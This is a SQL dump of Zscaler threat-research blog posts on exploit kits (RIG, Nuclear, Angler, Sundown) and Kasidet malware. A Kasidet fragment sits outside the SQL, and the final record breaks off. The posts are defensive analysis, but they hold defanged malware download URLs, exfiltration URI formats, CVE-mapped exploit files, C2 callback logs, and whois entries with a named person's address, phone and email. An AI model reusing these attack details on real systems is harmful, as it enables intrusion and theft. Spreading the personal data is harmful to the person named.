INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (109, 'A Case Of Keitaro (featuring RIG And Nuclear)', 'Ed Miles', 'February 29, 2016', 'Introduction    Zscaler ThreatLabZ closely monitors exploit kit activity and we have seen some interesting trends in RIG Exploit Kit behavior recently, including a significant spike in cases observed in the wild. We specifically saw large upticks in the closing weeks of January.      	  		  			  		  		  			Fig 1 - RIG Blocks over 2 Months  		  	      While trying to replicate some of the cases in our testing VMs, we found an infected site suddenly began serving Nuclear EK, and we noticed it doing so via a Keitaro Traffic Distribution System campaign. We have been monitoring these actors since, and in this blog we will briefly describe the activity seen among these campaigns of Keitaro, RIG, and Nuclear.    Keitaro TDS    Traffic Distribution Systems are software and service packages that do pretty much what the name says: their primary function is to intelligently route web traffic that arrives at the TDS operator controlled server. This is not to say they don\'t have any other functionality, major TDS packages like Keitaro actually provide a great deal of flexibility and control, and malware and exploit kit operators take significant advantage of these features.    In an industry that generally prefers to keep operational and functional details under wraps, Keitaro is an interesting beast that doesn\'t shy away from the public eye. Keitaro not only has a readily accessible public website with what appears to be a reasonable cost and easy purchase process, there is also a full online help section and an online demo!      	  		  			  		  		  			Fig. 2 - Keitaro TDS Dashboard  		  	      Overview    Keitaro has many features and options, and we don\'t want to recreate the online help files, so we will only cover some of the basics with few other interesting highlights. This TDS operates on highly-customizable campaigns which come in three flavors: standard redirects, banner serving, and simple impression tracking. These campaigns can have multiple \"streams\" chosen by linear or randomized selection, and can identify users by IP and/or cookie and enforce unique hits on them across variable timeframes.      	  		  			  		  		  			Fig 3 - Keitaro TDS Campaign Creation  		  	      Besides identifying users by IP and cookies, Keitaro can make decisions based upon a wide variety of features including:  - browser version  - geographic location  - OS/platform  - Mobile carrier    While we can\'t say which specific rules have been set up by the operators of this instance of Keitaro, we have seen some behaviors mentioned above (especially blocks on repeat attempts from the same source IPs) in addition to the gate serving both RIG and Nuclear at different times.    Observations    So far, we have described a system that seems perfectly above-board, however Keitaro has some features that appear to be designed specifically for bad-actors such as EK operators. One major feature recently highlighted by Kafeine is the addition of AV checks. This feature allows the TDS operator to make sure none of the payloads being served are detected by AV vendors. Conveniently, they integrate with services that don\'t share samples with the AV industry. Additionally, there is a section in the help files that specifically details how to break referer chains. This is a feature that directly impacts the ability of researchers to trace activity chains and connect exploit kit instances back to the originating site.      	  		  			  		  		  			Fig 4 - Keitaro TDS Help Information  		  	      While Keitaro appears to be very powerful and highly polished product, we spotted some interesting misconfiguration side effects from this campaign. Early on in our monitoring, the TDS would attempt to direct repeat visitors to \"www.yahoo.com\" using a 302 redirection. It turned out that, lacking the scheme portion of the URL, the redirect ended up sending users to the login page of the Keitaro admin panel. This is illustrated in the screenshot below, where an infected page has two injections for the Keitaro gate. The first injection yields a RIG cycle and the second improperly attempts to redirect to Yahoo.      	  		  			  		  		  			Fig 5 - Keitaro TDS Redirecting to Admin Panel  		  	      Another misconfiguration case we saw may have been an issue more related to the EK infrastructure than on the TDS itself, but one visit to an infected site yielded a redirect to an invalid RIG URL: hxxp://out%2520of%2520datedate/?apitoken=l3SKfPrFJx_ESYjCJunFSrdObkXRFh-BxoubkOM    Despite the occasional misconfigurations seen in this Keitaro instance, it has proven to be a significant source of traffic for both RIG and Nuclear.      	  		  			  		  		  			Fig 6 - Keitaro Traffic over 30 days  		  	      RIG    The RIG Exploit Kit has been very active in recent weeks, and we have identified multiple campaigns with some varying tactics. We\'ve seen a few cases of malvertising and multiple styles of gates including the occasionally misconfigured Keitaro already discussed..    Gates    In recent behavior, we have seen two primary types of gates being used besides Keitaro. The first was the common gate that has been seen in RIG campaigns for some time. The second was a series of gates that followed a pattern of using the same second level domain across four top level domains, rotating the second level names roughly every 24 hours.  Common RIG Gate  We don\'t have a clever name for this gate, but it\'s a familiar pattern, with a number of features at malware-traffic-analysis.net. It uses a host naming scheme similar to the infrastructure that actually delivers RIG landing pages and payloads: a two letter third level domain on top of what appear to be domain-shadowed accounts at Godaddy. The URL path in each case is a randomized .php filename with no parameters.    Quad Power Gate  Due to their use of the same second-level name across four TLD\'s, we are calling this the Quad Power Gate. This gate utilizes the TLDs .win, .top, .party, and .bid. Though the operators of this gate cycled the hostnames frequently, the path used for the gate\'s URLs has only changed twice. The first hits seen on the Zscaler network were to domain.tld/persil.php, but we later saw domain.tld/deliner.php. Beginning on the 23rd of February, we the gate began using the filenames \"magnum.php\" and \"puerto.php\".      	  		  			  		  		  			Fig 7 - Quad Power Gate Repeatedly Serving RIG  		  	      While a casual glance at the content returned by the gate might lead one to believe it\'s simply serving a jQuery script, the truth is that a RIG iframe is actually hidden between large blocks of Javascript. This gate also turns out to be a repeat offender, not only because we found its presence in a number of infected sites, but the gate has a tendency to repeatedly refresh itself, generating one RIG impression after the other. Although we could not confirm any specific instances, we believe this gate to have been used in malvertising attacks as well.    Landing Pages    RIG landing pages, much like the URL pattern used, has not changed too much. The landing page basically consists of one large blob, with multiple script objects, and several layers of encoding and obfuscation.      	  		  			  		  		  			Fig 8 - Exceprt from RIG Landing Page  		  	      Payloads    Execution is achieved on victim machines via two primary paths: first the usual IE/VBScript God Mode exploit (CVE-2014-6332), and second a large and highly obfuscated Flash payload. Despite the complexity of the protections employed, they are not using the Diffie Hellman-based protection for triggers and shellcode stages. The Flash payload appears to focus on CVE-2015-5122    As for malware, we have recently seen Tofsee being delivered by RIG.      	  		  			  		  		  			Fig 9 - Strings Decoded from Binary Data in RIG Payload  		  	      Nuclear    Like RIG, the Nuclear Exploit Kit is a prolific threat to web surfers. However, it maintains its position in the EK hierarchy, being more sophisticated than RIG yet not quite as cutting-edge as Angler. As an illustration of this point, we have not yet seen Nuclear adopt the latest Silverlight exploit that Angler recently debuted.      	  		  			  		  		  			Fig 10 - Nuclear Blocks over 2 Months  		  	      Gates    Besides the Keitaro gates, we have seen one prolific gate pattern over all else. The operators of this campaign seem to use infected sites which then redirect to the Nuclear landing page. We have seen some very interesting cases of this gate, including one site apparently owned by a bicycle shop in the UK. In this instance, the gate injection was served via the shop\'s Ebay page, in requests for embedded images.      	  		  			  		  		  			Fig 11 - Nuclear Gate Inject in Image from Ebay Listing  		  	      Landing Pages    Nuclear\'s landing page continues to utilize data stored in various HTML elements, which is then parsed by scripts to identify browser and plugin features and determine the execution flow.      	  		  			  		  		  			Fig 12 - Nuclear Landing Page Excerpt  		  	      Payloads    Nuclear continues the trend of delivering single file Flash payloads, with multiple secondary payloads: one each for Flash versions <18.0.0.203, <19.0.0.207, and higher. We saw an interesting change between the method used to transition to the secondary payloads.    The initial first-stage SWF used a complicated execution flow with the three payloads being constructed across multiple functions. In each case, two separate arrays of bytes are combined before a version-specific XOR key is used for the \"final\" payload. We use quotes around \"final\" because Nuclear continues to utilize a Diffie Hellman protocol to protect the actual exploit trigger and shellcode stage.      	  		  			  		  		  			Fig 13 - Nuclear Stage 1 Payload Obfuscation  		  	      The latter first-stage Flash payload dispensed with all of the complicated reconstruction, and simply uses base64-encoded strings to encode the second-stage SWFs. The second-stage payloads, however, were almost identical to those found in the previous iteration as shown below.      	  		  			  		  		  			Fig 14 - Nuclear Stage 2 Payload Comparison  		  	        The second stage exploits appeared to be CVE-2015-5122 for Flash <18.0.0.203, CVE-2015-7645 for <19.0.0.207, and the \"default\" case of CVE-2015-8651 for anything newer. Besides the Flash exploits, we also saw CVE-2013-2551 for direct exploitation of IE.    Following succesful exploitation, we have seen Dofoil being installed. The screenshot below shows its signature pattern of decoy GET and POST requests to URLs in the browser history with a few actual callbacks mixed in. The command & control server even uses 404 error codes to attempt to mask the nature of the callback activity.      	  		  			  		  		  			Fig 15 - Nuclear Cycle Including Dofoil Callback and Decoy Traffic  		  	      Conclusion    Though Nuclear and RIG both generate a good deal of impressions via other routes, the Keitaro gate has been a significant source of traffic on its own. It\'s clear that the flexibility in Keitaro\'s configuration options make it a powerful partner for the criminal operators of these and other exploit kits. As always, Zscaler ThreatLabZ will continue to monitor Nuclear, RIG, and Keitaro for further developments.', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/case-keitaro-featuring-rig-and-nuclear');

The malicious macro inside the Office document is obfuscated as shown in the code snapshot below -          	  		  			  		  		  			Macro code  		  	      The macro downloads malware payload from the hardcoded URL. We have seen following URLs used in different document payloads that we captured for this campaign:      	      armandosofsalem[.]com/l9k7hg4/b4387kfd[.]exe  	      trinity.ad-ventures[.]es/l9k7hg4/b4387kfd[.]exe  	      188.226.152[.]172/l9k7hg4/b4387kfd[.]exe      In this blog, we will provide a detailed analysis for the Kasidet variant that we spotted in this campaign.    Kasidet Analysis    Installation:   Kasidet installs itself into %APPDATA% folder. It creates a new folder there with the name \"Y1FeZFVYXllb\", this string is hardcoded in the malware. The same string is used as mutex name and in creating a Registry key for ensuring persistence upon system reboot.    AntiVM Check:  Kasidet tries to detect analysis systems during execution through following checks.  Checking Dubugger through \"IsDebuggerPresent\" and \"CheckRemoteDebuggerPresent\" Windows APIs. It also checks for the following popular sandbox related strings:      User Name: \"MALTEST\",  \"TEQUILABOOMBOOM\", \"SANDBOX\", \"VIRUS\", \"MALWARE\"    File Name: \"SAMPLE\", \"VIRUS\", \"SANDBOX\"        It tries to detect wine software by checking if kernel32.dll is exporting \"wine_get_unix_file_name\" function or not.

Memory Scraping – This allows Kasidet to steal credit card data from the memory of Point-Of-Sale (POS) systems. It scans the memory of all the running processes except the operating system processes listed below:  System  smss.exe  csrss.exe  winlogon.exe  lsass.exe  spoolsv.exe  devenv.exe    The stolen information is relayed back to the attacker using following URI format –     d=1&id=<MachineID>&name=<SystemName>&type=<Track1 or Track2 data>&data=<stolen data>&p=< Process elevation status >    2. Browser Hooking –  This allows Kasidet to steal data from Web browsers. It can inject code into FireFox, Chrome, and Internet Explorer (IE). Browser names are not saved in plain text and instead this variant uses the same hash function as used by Carberp malware to encrypt the browser names. The following APIs are hooked in the web browser for stealing sensitive data:         	  		  			  			Browser  			  			  			API  			  		  		  			  			FireFox  			  			  			PR_Write  			  		  		  			  			Chrome  			  			  			WSASend  			  		  		  			  			IE  			  			  			HttpSendRequestW , InternetWriteFile  			  		  	        The stolen information is relayed back to the attacker using following URI format –     ff=1&id=<MachineID>&name=<SystemName>&host=<Base64 encoded host name>&form=< Base64 encoded HTTP header data>&browser=<Browser name>  The information stealing feature of this Kasidet variant were deactivated if the system locale or GeoUserID corresponds to Russia.    Network communication:    Kasidet contains a hardcoded list of Command & Control (C&C) server locations. It uses CryptStringToBinary API call to decrypt the embedded C&C URLs as seen below:        	  		  			  		  		  			Kasidet C&C list  		  	      Upon successful infection, Kasidet sends a HTTP POST request with data “enter=1” (without quotes). All HTTP header fields (User-Agent, Content-type and Cookie) are hard coded in the payload itself.          	  		  			  		  		  			Kasidet Hardcoded HTTP fields  		  	      C&C Server will not return required data if HTTP header fields are different.  The server sends a fake 404 response code and html data stating that page is not found but the C&C commands will be hidden in the response HTML comment tag as seen below:      	  		  			  		  		  			  			  				  					  						Kasidet - First communication with C&C  					  				  			  			  		  	          Kasidet will request for additional commands from the C&C server with the following POST request:          	  		  			  		  		  			Kasidet request for additional commands  		  	               	  		  			  			Variable  			  			  			Descriptions  			  		  		  			  			cmd  			  			  			Command.

Dridex authors have leveraged this technique for over a year and it was interesting to see the same campaign and URLs being leveraged to deliver Kasidet payloads. While this does not establish any links between the two malware family authors, it reaffirms the fact that a lot of the underlying infrastructure and delivery mechanisms are often shared by these cyber criminals.    ThreatLabZ is actively monitoring this threat and ensuring signature coverage for Zscaler customers.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (112, 'Music-themed Malvertising Lead To Angler', 'ThreatLabz', 'January 19, 2016', 'Overview\r\nMalvertising, or \"malicious advertising,\" is not a new threat, and just a few weeks into 2016 ThreatLabZ has observed a malvertising campaign injecting iframes into banner advertisements that lead to Angler Exploit Kit. Surprisingly, the Angler operators took some vacation for the New Year, as noted by F-Secure, and have only recently resumed operations, so we were surprised to see a malvertising campaign so soon after their break.\r\n\r\nThis post will detail aspects of this campaign, and there is a reference list of indicators at the end of this post.\r\nOpenX/OpenAds and Malvertising\r\nOpenAds, now called OpenX or Revive Adserver, is an advertisement platform with a long history and is still quite popular. From a high level, when a user browses to a website using OpenAds for serving advertisements, small code stubs make requests to the OpenAds server, which decides which banner advertisement to run and sends the banner ad plus some tracking code back to the page. The banner advertisements usually rotate on some interval, and a single ad server can serve and control advertisements for multiple domains.\r\n\r\nUnfortuantely, the nature of banner advertisements makes them highly lucrative for criminal groups since injecting malicious content into an advertisement can impact hundreds or thousands of sites. This particular campaign impacted multiple OpenAds/OpenX servers which affected hundreds of domains. Intermediary sites were used as an additional hop prior to serving the Angler landing page, and only six second-level intermediary domains were observed, each using dozens of different subdomains and URIs. All six second-level intermediary domains share music-themed names:\r\n\r\n	everyoneismusical.com\r\n	musik4fingersonthemove.com\r\n	musik4littlefingers.com\r\n	youaremusical.com\r\n	youaremusicalforms.com\r\n	youaremusik.com\r\n\r\n\r\nInterestingly, these intermediary domains only use two different IPs for all the subdomains, and the operators appear to have changed hosts suddenly. Figure 1 shows the number of hits we captured for these two IPs.\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 1: Hits on Intermediary Domain IPs\r\n		\r\n	\r\n\r\n \r\n\r\niframe Trampolining\r\nThe infection cycle starts with a malicious iframe injected in the banner advertisement code that references an intermediary URL. The injected iframe loads transparently, and the intermediary domain server will respond in one of the following three ways:\r\n\r\n\r\n	Response code 200 - iframe to Angler Exploit Kit landing page\r\n	Response code 204 - no content\r\n	Response code 404 - fake \'not found\' page\r\n\r\nIf the intermediary domain serves an iframe, the Angler landing page is loaded transparently. A more complete overview of the infection cycle is shown below in Figure 2.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 2: Overview of Infection Cycle\r\n		\r\n	\r\n\r\n\r\n \r\nWe\'re calling the intermediary domain an \"iframe trampoline\" since the server may not respond with another iframe and can simply bounce the user out of the infection cycle with benign content.\r\n \r\nInfection Cycle\r\nLooking at a full infection cycle in Figure 3, the benign domain \'giftsnideas.com\' loads a banner ad with OpenX which contains an injected iframe to the trampoline domain. The trampoline domain\'s iframe finally sends the user to the Angler landing page. In this instance, the exploit failed, so no further content was loaded.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 3: Relevant URLs for Exploit Cycle\r\n		\r\n	\r\n\r\nBanner advertisement code on OpenAds/OpenX is very similar between servers. Figure 4 shows the injected iframe, which is simply inserted into the legitimate banner advertisement code.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 4: Advertisement with Injected iframe\r\n		\r\n	\r\n\r\nAll trampoline domains used a very similar URL format of two alphabetic directories followed by an alphabetic JavaScript file (.js). The only content loaded in every successful instance is an iframe to the Angler landing page, as shown in Figure 5.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 5: Trampoline Header and Response\r\n		\r\n	\r\n\r\nThe Angler landing page is exactly what you\'d expect and although there have been some recent changes, we won\'t rehash Angler in this post.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 6: Angler Landing Page\r\n		\r\n	\r\n\r\n \r\n\r\nConclusion\r\nMalvertising continues to be a highly effective means of targeting and compromising a large number of victims, and we expect this trend to continue for 2016. We noted that many of the victim sites we observed in this campaign were radio stations and auto enthusiast forums. Domains in these two groups are owned by Saga Communications and Autoforums.com, so it\'s likely that each uses a small number of ad servers to power the entire network of sites. ThreatLabZ will continue to monitor this campaign.\r\n \r\nIndicators\r\n \r\n\r\n\r\n	\r\n		\r\n			# Hits\r\n			Second Level Domain\r\n			Registrar\r\n			Registrant\r\n		\r\n		\r\n			23883\r\n			youaremusik.com\r\n			GODADDY\r\n			Mark Lippman\r\n		\r\n		\r\n			20681\r\n			musik4fingersonthemove.com\r\n			GODADDY\r\n			Mark Lippman\r\n		\r\n		\r\n			16878\r\n			everyoneismusical.com\r\n			GODADDY\r\n			Michael Lippman\r\n		\r\n		\r\n			16849\r\n			musik4littlefingers.com\r\n			GODADDY\r\n			Mark Lippman\r\n		\r\n		\r\n			5698\r\n			youaremusical.com\r\n			GODADDY\r\n			Michael Lippman\r\n		\r\n		\r\n			1619\r\n			youaremusicalforms.com\r\n			GODADDY\r\n			Michael Lippman\r\n		\r\n	\r\n\r\n \r\n\r\nURL IPs\r\n188.227.72.137 - IT-Grad nets - AS48096\r\n188.227.74.150 - IT-Grad nets - AS48096\r\n\r\nList of FQDNs and URLs\r\n\r\nCounts and FQDNs - via Pastebin (http://pastebin.com/7vSYi2uz)\r\n\r\nURLs - via Pastebin (http://pastebin.com/QN9WqzPn)\r\n\r\n \r\n\r\nWhois Samples\r\nDomain Name: MUSIK4LITTLEFINGERS.COM\r\nRegistry Domain ID: 1916653940_DOMAIN_COM-VRSN\r\nRegistrar WHOIS Server: whois.godaddy.com\r\nRegistrar URL: http://www.godaddy.com\r\nUpdate Date: 2015-04-05T16:22:42Z\r\nCreation Date: 2015-04-05T16:22:42Z\r\nRegistrar Registration Expiration Date: 2018-04-05T16:22:42Z\r\nRegistrant Name: Mark Lippman\r\nRegistrant Organization:\r\nRegistrant Street: 4 Cloverbrooke Court\r\nRegistrant City: Potomic\r\nRegistrant State/Province: Maryland\r\nRegistrant Postal Code: 20854\r\nRegistrant Country: US\r\nRegistrant Phone: +1.2404294083\r\nRegistrant Phone Ext:\r\nRegistrant Fax: +1.1\r\nRegistrant Fax Ext:\r\nRegistrant Email: mhlippman@gmail.com\r\nRegistry Admin ID:\r\nAdmin Name: Mark Lippman\r\nAdmin Organization:\r\nAdmin Street: 4 Cloverbrooke Court\r\nAdmin City: Potomic\r\nAdmin State/Province: Maryland\r\nAdmin Postal Code: 20854\r\nAdmin Country: US\r\nAdmin Phone: +1.2404294083\r\nAdmin Phone Ext:\r\nAdmin Fax: +1.1\r\nAdmin Fax Ext:\r\nAdmin Email: mhlippman@gmail.com\r\nRegistry Tech ID:\r\nTech Name: Mark Lippman\r\nTech Organization:\r\nTech Street: 4 Cloverbrooke Court\r\nTech City: Potomic\r\nTech State/Province: Maryland\r\nTech Postal Code: 20854\r\nTech Country: US\r\nTech Phone: +1.2404294083\r\nTech Phone Ext:\r\nTech Fax: +1.1\r\nTech Fax Ext:\r\nTech Email: mhlippman@gmail.com\r\nName Server: NS67.DOMAINCONTROL.COM\r\nName Server: NS68.DOMAINCONTROL.COM\r\n \r\n\r\n\r\nDomain Name: EVERYONEISMUSICAL.COM\r\n\r\nRegistry Domain ID: 1917710979_DOMAIN_COM-VRSN\r\n\r\nRegistrar WHOIS Server: whois.godaddy.com\r\n\r\nRegistrar URL: http://www.godaddy.com\r\n\r\nUpdate Date: 2015-06-04T12:18:00Z\r\n\r\nCreation Date: 2015-04-08T19:34:50Z\r\n\r\nRegistrar Registration Expiration Date: 2018-04-05T11:59:59Z\r\n\r\nRegistrar: GoDaddy.com, LLC\r\n\r\nRegistrar IANA ID: 146\r\n\r\nRegistrar Abuse Contact Email: abuse@godaddy.com\r\n\r\nRegistrar Abuse Contact Phone: +1.4806242505\r\n\r\nDomain Status: clientTransferProhibited http://www.icann.org/epp#clientTransferProhibited\r\n\r\nDomain Status: clientUpdateProhibited http://www.icann.org/epp#clientUpdateProhibited\r\n\r\nDomain Status: clientRenewProhibited http://www.icann.org/epp#clientRenewProhibited\r\n\r\nDomain Status: clientDeleteProhibited http://www.icann.org/epp#clientDeleteProhibited\r\n\r\nRegistry Registrant ID: \r\n\r\nRegistrant Name: Michael Lippman\r\n\r\nRegistrant Organization: \r\n\r\nRegistrant Street: 4 Cloverbrooke Court\r\n\r\nRegistrant City: Potomic\r\n\r\nRegistrant State/Province: Maryland\r\n\r\nRegistrant Postal Code: 20854\r\n\r\nRegistrant Country: US\r\n\r\nRegistrant Phone: +1.2404298083\r\n\r\nRegistrant Phone Ext:\r\n\r\nRegistrant Fax: \r\n\r\nRegistrant Fax Ext:\r\n\r\nRegistrant Email: mhlippman@gmail.com\r\n\r\nRegistry Admin ID: \r\n\r\nAdmin Name: Michael Lippman\r\n\r\nAdmin Organization: \r\n\r\nAdmin Street: 4 Cloverbrooke Court\r\n\r\nAdmin City: Potomic\r\n\r\nAdmin State/Province: Maryland\r\n\r\nAdmin Postal Code: 20854\r\n\r\nAdmin Country: US\r\n\r\nAdmin Phone: +1.2404298083\r\n\r\nAdmin Phone Ext:\r\n\r\nAdmin Fax: \r\n\r\nAdmin Fax Ext:\r\n\r\nAdmin Email: mhlippman@gmail.com\r\n\r\nRegistry Tech ID: \r\n\r\nTech Name: Michael Lippman\r\n\r\nTech Organization: \r\n\r\nTech Street: 4 Cloverbrooke Court\r\n\r\nTech City: Potomic\r\n\r\nTech State/Province: Maryland\r\n\r\nTech Postal Code: 20854\r\n\r\nTech Country: US\r\n\r\nTech Phone: +1.2404298083\r\n\r\nTech Phone Ext:\r\n\r\nTech Fax: \r\n\r\nTech Fax Ext:\r\n\r\nTech Email: mhlippman@gmail.com\r\n\r\nName Server: NS37.DOMAINCONTROL.COM\r\n\r\nName Server: NS38.DOMAINCONTROL.COM', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/music-themed-malvertising-lead-angler');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (113, 'There Goes The Neighborhood -  Bad Actors On GMHOST Alexander Mulgin Serginovic', 'Ed Miles', 'January 12, 2016', 'Introduction\r\nWhether they encourage it or not, some network operators become known and favored by criminals such as those that operate exploit kit (EK) and malware infrastructure. After following up the Sundown EK recently pointed out by @malwareforme on the Threatglass database, we found Neutrino (looking like Angler) and other bad behavior in the same network \"neighborhood\".\r\n\r\nIt\'s not clear what reputation this hoster has within the underground community, but the Sundown and Neutrino campaigns both appeared within the same address space registered under \"Alexander Mulgin Serginovic\" (AMS) with the first Neutrino hits coinciding with the last few hits of Sundown\'s December 2015 campaign. We have not identified any link between these campaigns apart from the hoster, but we wanted to provide a quick look at some of these activities and the specific indicators we have seen.\r\n \r\nSundown Behavior\r\n\r\nOther analysts have observed the emergence of the Sundown EK (aka Beta Exploit Pack), with Kafeine in particular commenting that Sundown is a very simple EK compared to the more mature kits like Angler. This continues to be the case, however we have seen that the group operating Sundown has made adjustments, including some changes that happened in the midst of this campaign.\r\n\r\n \r\nInjects\r\nThe campaign on ForoMTB Sundown used a small malicious inject within one of the included JavaScript libraries:\r\n \r\n\r\n\r\nOn CinemaHD, we saw a basic IFRAME inserted directly into the page:\r\n \r\n\r\n \r\n\r\nGates\r\n\r\n \r\n\r\nDuring December we saw the gate \"millychiccolo[.]space/jhgrjhk.php\", and after the new year we have seen \"pienadigrazia[.]space/counter.php\" though we also saw direct traffic from the compromised sites.\r\n\r\nLanding Pages\r\n\r\n\r\nIn the past 45 days we have seen Sundown operate with various domains hosting the landing pages, but only on two different IPs: 81.94.199.16 and 185.86.77.160. The path component of the landing page has gone through several iterations. The early hits in this campaign were seen to \"millychiccolo[.]space/?9b5b49f7f8c07f43effe4aecc67bf254\". Later, the landing page path was encoded with base64 as such: \"millychiccolo.space/?OWI1YjQ5ZjdmOGMwN2Y0M2VmZmU0YWVjYzY3YmYyNTQ=\". It should be noted that this base64 string decodes to the same MD5-looking path used in the first instance. Sundown changed up the underlying \"MD5\" for the new year, and we have seen landing pages at \"arbitraryh.top/?NjExODEzY2MzNTkyZTkyYWYxZmNlYjExODQzMzAz\" (the path decodes to 611813cc3592e92af1fceb11843303).\r\n\r\n \r\n\r\nThese are some of the domains we saw delivering Sundown landing pages, exploits, and malware payloads:\r\n\r\n\r\nnomeatea.space\r\nmillychiccolo.space\r\npianolessons.co.vu\r\ntequeryomuch.space\r\nilsignoreconte.space\r\narbitraryh.top\r\npienadigrazia.space\r\n\r\n\r\n \r\n\r\nDespite the path changes, the behavior of the Sundown landing page is still quite simple: a \"carpet bombing\" where many or all possible exploits are tried, in some cases with multiple successes. An example of the exploitation flow:\r\n\r\n\r\nilsignoreconte[.]space/new/e/360a296ea1e0abb38f1080f5e802fb4b.html\r\nilsignoreconte[.]space/new/e/053d33558d578d2cafe77639209ab4d9.html\r\nilsignoreconte[.]space/new/e/49c58cc2b166b1a5b13eab5f472a4f7b.html\r\nilsignoreconte[.]space/new/e/49c58cc2b166b1a5b13eab5f472a4f7b.swf\r\n\r\n\r\nExploit Payloads\r\n\r\nSundown was seen sending the following exploit payloads:\r\npoc2.flv - CVE-2015-3113\r\n49c58cc2b166b1a5b13eab5f472a4f7b.swf - CVE-2015-5122\r\n865hkjjhgfhjrgjkgyjtyg6lkjthyrkljtgh.html - CVE-2015-2419\r\n8573855j6lhk4j54kl5jhk53j654364354.html - CVE-2013-2551\r\n8500d58389eba3b3820a17641449b81d.html - CVE-2014-6332\r\n360a296ea1e0abb38f1080f5e802fb4b.swf - CVE-2014-0515\r\n053d33558d578d2cafe77639209ab4d9.swf - CVE-2015-3113 (via poc2.flv)\r\n\r\n\r\nMalware Payloads\r\n\r\nThe delivery of the malware samples was another aspect of Sundown that we saw change. Through December 26, the malware payloads were downloaded from the URL \"tequeryomuch[.]space/new/download.php?d=9b5b49f7f8c07f43effe4aecc67bf254\". On the 27th we saw payloads coming from \"tequeryomuch[.]space/?NGFlY2M2N2JmMjU0&d=9b5b49f7f8c07f43effe4aecc67bf254\".\r\n\r\nSome of the samples we observed during this campaign:\r\n\r\n\r\nSample\r\n4BAEEE098C34B463EB8AC709B9BD9967 (the sample seen on Threatglass)\r\n\r\nBehavior\r\n{\"dropped_path\":\"C:\\\\Documents and Settings\\\\user\\\\Application Data\\\\ZlFZQkBA\\\\twunk_32.exe\",\"dropped_md5\":\"4BAEEE098C34B463EB8AC709B9BD9967\"}\r\n{\"dropped_path\":\"C:\\\\WINDOWS\\\\Tasks\\\\ZlFZQkBA.job\",\"dropped_md5\":\"22D5FD2A8675CF3B673D84716384AE8A\"}\r\n\r\n{\"url\":\"imagescdn[.]ru/redir.php\",\"destIP\":\"5.206.60.129\",\"ua\":\"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/38.0, Content-type: application/x-www-form-urlencoded\",\"method\":\"POST\",\"destPort\":\"80\"}\r\n{\"url\":\"imagescdn[.]ru/redir.php\",\"destIP\":\"178.137.82.42\",\"ua\":\"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/38.0, Content-type: application/x-www-form-urlencoded\",\"method\":\"POST\",\"destPort\":\"80\"}\r\n{\"url\":\"imagescdn[.]ru/redir.php\",\"destIP\":\"213.231.31.192\",\"ua\":\"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/38.0, Content-type: application/x-www-form-urlencoded\",\"method\":\"POST\",\"destPort\":\"80\"}\r\n\r\n\r\n\r\nSample\r\nD754B473AF45B8D3565C1323D29EAD51\r\n\r\nBehavior\r\n{\"dropped_path\":\"C:\\\\Documents and Settings\\\\user\\\\Application Data\\\\ZlFZQkBA\\\\taskman.exe\",\"dropped_md5\":\"D754B473AF45B8D3565C1323D29EAD51\"}\r\n{\"dropped_path\":\"C:\\\\WINDOWS\\\\Tasks\\\\ZlFZQkBA.job\",\"dropped_md5\":\"07808D2E9A1D1607FCB81C1E0CA03358\"}\r\n\r\n{\"url\":\"imagescdn[.]ru/redir.php\",\"destIP\":\"109.251.77.14\",\"ua\":\"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/38.0\r\nContent-type: application/x-www-form-urlencoded\",\"method\":\"POST\",\"destPort\":\"80\"}\r\n{\"url\":\"imagescdn[.]ru/redir.php\",\"destIP\":\"109.251.77.14\",\"ua\":\"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/38.0\r\nContent-type: application/x-www-form-urlencoded\",\"method\":\"POST\",\"destPort\":\"80\"}\r\n{\"url\":\"imagescdn[.]ru/redir.php\",\"destIP\":\"213.111.238.98\",\"ua\":\"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/38.0\r\nContent-type: application/x-www-form-urlencoded\",\"method\":\"POST\",\"destPort\":\"80\"}\r\n\r\n\r\n\r\nSample\r\n6580F61B8B1AABFE3CAD6983CA9B2505\r\n\r\nBehavior\r\n{\"dropped_path\":\"C:\\\\DOCUME~1\\\\user\\\\LOCALS~1\\\\Temp\\\\svchost.exe\",\"dropped_md5\":\"FAA8EA9027ED6B6C875C247E59285270\"}\r\n{\"dropped_path\":\"C:\\\\Documents and Settings\\\\user\\\\Application Data\\\\programutiliity\\\\filename.exe\",\"dropped_md5\":\"A1429E43D7F19EB893FCC5D7BD2B21E9\"}\r\n{\"dropped_path\":\"C:\\\\Documents and Settings\\\\user\\\\Start Menu\\\\Programs\\\\Startup\\\\filename.bat\",\"dropped_md5\":\"7C444F8193480F6DC571BB6483E60A6A\"}\r\n \r\n\r\n\r\nGeographic Distribution\r\n\r\nWe\'ve primarily seen this Sundown campaign affect users located in Spain, though this may have more to do with the fact that the primary infected site is a Spanish-language forum.\r\n\r\n \r\n\r\n\r\n \r\nControl Panel Login\r\n\r\nThough we did not make any efforts to break into the Control Panel, we found it interesting that the login portal was so readily available to anyone who bothered to poke around at all. It\'s definitely looking a little flashier since Kafeine\'s analysis.\r\n \r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\nNeutrino Behavior\r\n\r\nNeutrino, like Sundown, operates in the shadow of Angler. In this case, the first signs of activity seen in the campaign actually look very much like Angler, so much so that Blue Coat\'s blog about the same activity was later updated to correct the identification. Regardless of whether the initial traffic is actually Angler or not, the campaign changed noticeably over the observed duration. 